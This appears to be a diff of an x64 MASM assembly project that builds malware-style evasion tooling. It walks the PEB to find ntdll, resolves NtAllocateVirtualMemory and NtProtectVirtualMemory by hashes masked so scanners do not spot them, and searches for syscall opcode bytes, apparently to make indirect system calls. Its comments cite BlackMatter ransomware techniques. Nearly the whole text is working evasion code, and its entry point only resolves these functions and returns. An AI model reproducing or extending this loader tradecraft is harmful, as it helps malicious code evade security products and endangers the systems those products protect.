@@ -26,7 +26,7 @@
 ; will increase the overall entropy of the respective code blocks. We can       ;
 ; get this entropy down by building up the hash over multiple instructions.     ;
 ;                                                                               ;
-; The developers of Blackmatter have taken this a step further and will         ;
+; The developers of BlackMatter have taken this a step further and will         ;
 ; perform the encoding dynamically based on a runtime derived random value.     ;
 ; The code snippets for encoding/decoding the hashes are generated dynamically  ;
 ; at runtime.                                                                   ;
@@ -121,6 +121,7 @@ s_shl           equ 0xe0c1                  ; shl                               
                                                                                 ;
 ; Get an assembly-time random value of a specific size. Maximum 32 bits.        ;
 ; This value will change on successive expansions                               ;
+; credit to mabdelouahab@masm32.com                                             ;
 rnd macro __mask                                                                ;
     local m                                                                     ;
     m=(@SubStr(%@Time,7,2)+@Line)*(@SubStr(%@Date,1,2)                          ;
@@ -130,48 +131,6 @@ rnd macro __mask                                                                
         m = m and __mask                                                        ;
     endif                                                                       ;
     exitm % m                                                                   ;
-endm                                                                            ;
-                                                                                ;
-; Emit some junk bytes that look vaguely like real code                         ;
-emit_junk macro                                                                 ;
-    local v1, v2, r0, r1, r2, r3, r4, b                                         ;
-    count = 0                                                                   ;
-    ...                                                                         ;
-endm                                                                            ;
-                                                                                ;
-; Emit a junk operation of the given type (example/incomplete)                  ;
-emit_junk_op macro v1, opc, r1, r2                                              ;
-    if v1 eq 0                                                                  ;
-        db s_pfx_rexw                                                           ;
-        db opc                                                                  ;
-        b = r2                                                                  ;
-        b = (b shl 3) or (r1)                                                   ;
-        db b                                                                    ;
-    elseif v1 eq 1                                                              ;
-        db opc                                                                  ;
-        b = r1                                                                  ;
-        b = (b shl 3) or (r2)                                                   ;
-        db b                                                                    ;
-    elseif v1 eq 2                                                              ;
-        db opc                                                                  ;
-        b = r2                                                                  ;
-        b = (b shl 3) or (r1)                                                   ;
-        db b                                                                    ;
-    endif                                                                       ;
-endm                                                                            ;
-                                                                                ;
-; Emit a junk conditional comparison                                            ;
-emit_junk_jcnd macro v, dist                                                    ;
-    if v eq 0                                                                   ;
-        db s_ja_rel8                                                            ;
-        db dist                                                                 ;
-    elseif v eq 1                                                               ;
-        db s_jle_rel8                                                           ;
-        db dist                                                                 ;
-    elseif v eq 2                                                               ;
-        db s_jne_rel8                                                           ;
-        db dist                                                                 ;
-    endif                                                                       ;
 endm                                                                            ;
                                                                                 ;
 ; Emit the bytes of a string                                                    ;
@@ -186,6 +145,8 @@ emit_jmp_rel8 macro dist                                                        
     db s_jmp_rel8                                                               ;
     db dist                                                                     ;
 endm                                                                            ;
+
+
 ; ----------------------------------------------------------------------------- ;
 ;                           Dynamic Import Macros                               ;
 ; ----------------------------------------------------------------------------- ;
@@ -193,10 +154,9 @@ endm                                                                            
 ; Our defined hashes / hashing values. We mask embedded hashes, offsets, and    ;
 ; primes with our own value to avoid detections on these values.                ;
 ;                                                                               ;
-; We use the `static_rnd` compile time macro, credit to mabdelouahab@masm32.com ;
-;                                                                               ;
 ; Get an assembly-time random byte. This value will stay the same on successive ;
-; expansions                                                                    ;
+; expansions.                                                                   ;
+;                                                                               ;
 static_rnd macro __mask                                                         ;
     local m                                                                     ;
     m=(@SubStr(%@Time,7,2)) xor (@SubStr(%@Date,7,2))                           ;
@@ -217,17 +177,14 @@ hash_prime      equ            0x01000193  xor random_mask                      
 ;                                                                               ;
 hash_ntdll      equ            0x25959F7F xor random_mask                       ;
 hash_ntavm      equ            0x6973F2B4 xor random_mask                       ;
+hash_ntpvm      equ            0xB7F40932 xor random_mask                       ;
                                                                                 ;
-; Data Structures ------------------------- ;                                   ;
-dynimp_entry struct                         ; dynamic import table entry        ;
-    address qword ?                         ; our encoded function pointer      ;
-dynimp_entry ends                           ;                                   ;
-                                            ;                                   ;
 dynimp struct                               ; our dynamic import table          ;
-    entries qword ?                         ; pointer to entries                ;
+    ntavm   qword ?
+    ntpvm   qword ?
     len     dword ?                         ; number of entries                 ;
-dynimp ends                                 ;                                   ;
-; ----------------------------------------- ;                                   ;
+dynimp ends                                                                     ;
+                                                                                ;
 ;                                                                               ;
 ; ----------------------------------------------------------------------------- ;
 ;                               Executable Code                                 ;
@@ -236,8 +193,6 @@ text segment align(10h) 'code' read execute ;                                   
 ;                                           ;                                   ;
 ; Program entry point                       ;                                   ;
 start proc                                  ;                                   ;
-    local   d_ents[10]:dynimp_entry         ; encoded address on the stack      ;
-    local   d_table:dynimp                  ; dynamic api table                 ;
     push    rbx
     mov     rcx, hash_ntdll                 ; encoded hash of `ntdll.dll`       ;
     call    getmod                          ; get module base of ntdll.dll      ;
@@ -245,13 +200,23 @@ start proc                                  ;                                   
     mov     rbx, rax
     mov     rdx, hash_ntavm                 ; rdx encoded function hash         ;
     call    getexp                          ; resolve address by hash           ;
-    mov     edx, [d_table.len]              ; store the result in the table     ;
-    inc     [d_table.len]                   ;                                   ;
+    mov     rcx, rax
+    lea     rdx, _syscall_sig
+    mov     r8, 2
+    mov     r9, 20
+    call    find_bytes
+
+
+
+
+
     mov     rcx, rax                        ; rcx is the unencoded address      ;
-    mov     rcx, rbx
-    mov     rdx, 0x69696969
+    mov     rcx, rbx                    
+    mov     rdx, hash_ntpvm
     call    getexp
-    ret                                     ; 
+    ret   
+_syscall_sig:                                 
+    db 0x0f, 0x05
     ;                                       ; 
     ;                                       ; 
 start endp                                  ;                                   ;
@@ -343,12 +308,9 @@ getmod proc fastcall hash:qword             ;                                   
     local   modname[256*2]:byte             ; stack space for module name buf   ;
     local   first:qword                     ; first module entry                ;
     local   curr:qword                      ; current module entry              ;
-    local   brbx:qword
-    local   brsi:qword
-    local   brdi:qword
-    mov     brbx, rbx
-    mov     brsi, rsi
-    mov     brdi, rdi
+    push    rbx
+    push    rsi
+    push    rdi
     mov     rdi, rcx                        ;                                   ;
     mov     rsi, [gs:0x60]                  ; get PEB                           ;
     mov     rsi, [rsi].peb.ldr              ; rsi -> PEB_LDR_DATA entry         ;
@@ -379,9 +341,9 @@ _loop:                                      ; loop over modules                 
 _match:                                     ;                                   ;
     mov     rax, [rbx].ldte.dllbase         ; get dll base address              ;
 _done:                                      ;                                   ;
-    mov     rdi, brdi
-    mov     rsi, brsi
-    mov     rbx, brbx
+    pop     rdi
+    pop     rsi
+    pop     rbx
     retn                                    ;                                   ;
 getmod endp                                 ;                                   ;
 ; ----------------------------------------- ;                                   ;
@@ -415,7 +377,7 @@ _done:                                      ;                                   
 gethash endp                                ;                                   ;
 ; ----------------------------------------- ;
 ; Find matching bytes in memory
-find_bytes proc fastcall src:qword, buf:qword, len:dword 
+find_bytes proc fastcall src:qword, buf:qword, len:dword, max:dword
     push    rbx
     push    rsi
     push    rdi
@@ -426,14 +388,16 @@ find_bytes proc fastcall src:qword, buf:qword, len:dword
     xor     r10, r10
 _loop:
     xor     eax, eax
-    cmp     r10, rbx
+    cmp     r10, r9
     je      _done
     mov     rcx, rsi
     mov     rdx, rdi
     inc     r10
     inc     rsi
     mov     r8, rbx
+    push    r9
     call    memcmp
+    pop     r9
     test    eax, eax
     jz      _loop
 _match:
